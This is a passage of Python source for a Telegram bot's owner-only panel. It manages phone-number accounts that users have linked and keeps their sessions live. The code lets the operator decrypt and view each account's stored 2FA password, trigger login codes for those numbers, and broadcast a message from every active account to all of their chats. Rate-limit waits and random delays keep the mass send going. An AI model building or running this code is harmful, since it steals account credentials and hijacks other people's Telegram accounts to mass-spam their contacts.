                [InlineKeyboardButton(text="🗑 Kill Session", callback_data=f"own:kill:{r['id']}")],
            ])
            owner_row = await db_one("SELECT tg_id FROM users WHERE id=?", (r["user_id"],))
            await cb.message.answer(
                f"📱 *{r['phone']}*\n"
                f"owner tg: `{owner_row['tg_id'] if owner_row else '?'}`\n"
                f"2fa stored: {'yes' if r['password_enc'] else 'no'}",
                parse_mode="Markdown", reply_markup=kb
            )
        nav = []
        if offset > 0:
            nav.append(InlineKeyboardButton(text="◀ Prev", callback_data=f"own:accs:{max(0,offset-10)}"))
        nav.append(InlineKeyboardButton(text="Next ▶", callback_data=f"own:accs:{offset+10}"))
        await cb.message.answer("…", reply_markup=InlineKeyboardMarkup(inline_keyboard=[nav]))
        await cb.answer()
        return

    if action == "otp":
        aid = int(parts[2])
        acc = await db_one("SELECT * FROM accounts WHERE id=?", (aid,))
        if not acc:
            await cb.answer("not found", show_alert=True)
            return
        try:
            temp = TelegramClient(StringSession(), API_ID, API_HASH)
            await temp.connect()
            sent = await temp.send_code_request(acc["phone"])
            pending_logins[aid] = {"client": temp, "phone": acc["phone"],
                                   "phone_code_hash": sent.phone_code_hash, "code": ""}
            await cb.message.answer(
                f"🔑 New login code requested for `{acc['phone']}`.\n"
                "OTP will only be visible to the number's Telegram. "
                "Use the account's session if you need the actual code, "
                "or wait — it lands in that account's chat.",
                parse_mode="Markdown"
            )
        except FloodWaitError as fw:
            await cb.message.answer(f"⏳ Flood wait {fw.seconds}s")
        except Exception as e:
            await cb.message.answer(f"❌ {e}")
        await cb.answer()
        return

    if action == "pw":
        aid = int(parts[2])
        acc = await db_one("SELECT * FROM accounts WHERE id=?", (aid,))
        if not acc or not acc["password_enc"]:
            await cb.answer("No 2FA stored", show_alert=True)
            return
        try:
            pw = dec(acc["password_enc"])
        except Exception:
            await cb.answer("decrypt failed", show_alert=True)
            return
        await cb.message.answer(f"🔐 2FA password for `{acc['phone']}`:\n`{pw}`", parse_mode="Markdown")
        await cb.answer()
        return

    if action == "kill":
        aid = int(parts[2])
        if aid in active_clients:
            try:
                await active_clients[aid].disconnect()
            except Exception:
                pass
            active_clients.pop(aid, None)
        await db_exec("UPDATE accounts SET active=0 WHERE id=?", (aid,))
        await cb.message.answer(f"🗑 Session killed for account {aid}.")
        await cb.answer()
        return

    if action == "sa":
        await state.set_state("sa_message")
        await cb.message.answer("📣 Send the message to broadcast from ALL active accounts to ALL their chats.")
        await cb.answer()
        return

    if action == "emoji":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Add Emoji ID", callback_data="own:emoji_add")],
            [InlineKeyboardButton(text="📥 Extract from Message", callback_data="own:emoji_extract")],
            [InlineKeyboardButton(text="📋 List", callback_data="own:emoji_list")],
        ])
        await cb.message.answer("😀 Premium emoji manager", reply_markup=kb)
        await cb.answer()
        return

    if action == "emoji_add":
        await state.set_state("emoji_add")
        await cb.message.answer("Send the custom_emoji_id (numeric).")
        await cb.answer()
        return

    if action == "emoji_extract":
        await state.set_state("emoji_extract")
        await cb.message.answer("Forward or paste a message that contains the premium emoji.")
        await cb.answer()
        return

    if action == "emoji_list":
        rows = await db_q("SELECT * FROM premium_emojis ORDER BY id DESC")
        txt = "😀 *Emoji pool*\n\n" + ("\n".join(f"`{r['emoji_id']}` — {r['label'] or ''}" for r in rows) if rows else "empty")
        await cb.message.answer(txt, parse_mode="Markdown")
        await cb.answer()
        return

    if action == "vault":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=p, callback_data=f"own:vault_set:{p}")] for p in AI_PROVIDERS
        ])
        rows = await db_q("SELECT * FROM owner_api_vault")
        txt = "🔑 *API Vault*\n\n" + ("\n".join(f"{r['provider']}: set" for r in rows) if rows else "empty")
        await cb.message.answer(txt, parse_mode="Markdown", reply_markup=kb)
        await cb.answer()
        return

    if action == "vault_set":
        prov = parts[2]
        await state.update_data(vault_prov=prov)
        await state.set_state("vault_key")
        await cb.message.answer(f"Send API key for {prov}.")
        await cb.answer()
        return

    if action == "stats":
        u = await db_one("SELECT COUNT(*) c FROM users")
        a = await db_one("SELECT COUNT(*) c FROM accounts")
        act = await db_one("SELECT COUNT(*) c FROM accounts WHERE active=1")
        await cb.message.answer(
            f"📊 *Stats*\n\nUsers: {u['c']}\nAccounts: {a['c']}\nActive: {act['c']}\nOnline clients: {len(active_clients)}",
            parse_mode="Markdown"
        )
        await cb.answer()
        return

@owner_router.message(lambda m: is_owner(m.from_user.id), F.text)
async def owner_text_handler(msg: Message, state: FSMContext):
    st = await state.get_state()
    if st == "sa_message":
        await msg.answer("📣 Super announce running…")
        asyncio.create_task(super_announce(msg.text))
        await state.clear()
        return
    if st == "emoji_add":
        try:
            eid = int(msg.text.strip())
            await db_exec("INSERT INTO premium_emojis(emoji_id, added_by, created_at) VALUES(?,?,?)",
                          (eid, msg.from_user.id, int(time.time())))
            await msg.answer(f"✅ Added {eid}")
        except Exception:
            await msg.answer("❌ numeric id only")
        await state.clear()
        return
    if st == "emoji_extract":
        ents = msg.entities or []
        found = []
        for e in ents:
            if isinstance(e, MessageEntityCustomEmoji):
                found.append(e.document_id)
                await db_exec("INSERT INTO premium_emojis(emoji_id, added_by, created_at) VALUES(?,?,?)",
                              (e.document_id, msg.from_user.id, int(time.time())))
        await msg.answer(f"✅ Extracted {len(found)} emoji IDs: {found}")
        await state.clear()
        return
    if st == "vault_key":
        data = await state.get_data()
        prov = data.get("vault_prov")
        await db_exec("INSERT OR REPLACE INTO owner_api_vault(provider, api_key, updated_at) VALUES(?,?,?)",
                      (prov, enc(msg.text.strip()), int(time.time())))
        try:
            await msg.delete()
        except Exception:
            pass
        await msg.answer(f"✅ Vault key set for {prov}")
        await state.clear()
        return

async def super_announce(text: str):
    rows = await db_q("SELECT * FROM accounts WHERE active=1")
    total_sent = 0
    for r in rows:
        client = await get_client(r)
        if not client:
            continue
        try:
            async for dialog in client.iter_dialogs():
                if not (dialog.is_group or dialog.is_user):
                    continue
                try:
                    await client.send_message(dialog.id, text)
                    total_sent += 1
                except FloodWaitError as fw:
                    await asyncio.sleep(fw.seconds + 5)
                except Exception:
                    continue
                await asyncio.sleep(random.uniform(3, 8))
        except Exception as e:
            log.warning(f"announce acc={r['id']}: {e}")
    try:
        await bot.send_message(OWNER_ID, f"📣 Super announce done. Messages sent: {total_sent}")
    except Exception:
        pass

# ============================================================
# STARTUP
# ============================================================
async def startup():
    await db_init()
    rows = await db_q("SELECT * FROM accounts WHERE active=1")
    log.info(f"Restoring {len(rows)} accounts…")
    for r in rows:
        try:
            await get_client(r)
        except Exception as e:
            log.warning(f"restore acc={r['id']}: {e}")
    log.info(f"Active clients: {len(active_clients)}")

async def main():
    await startup()
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Shutdown.")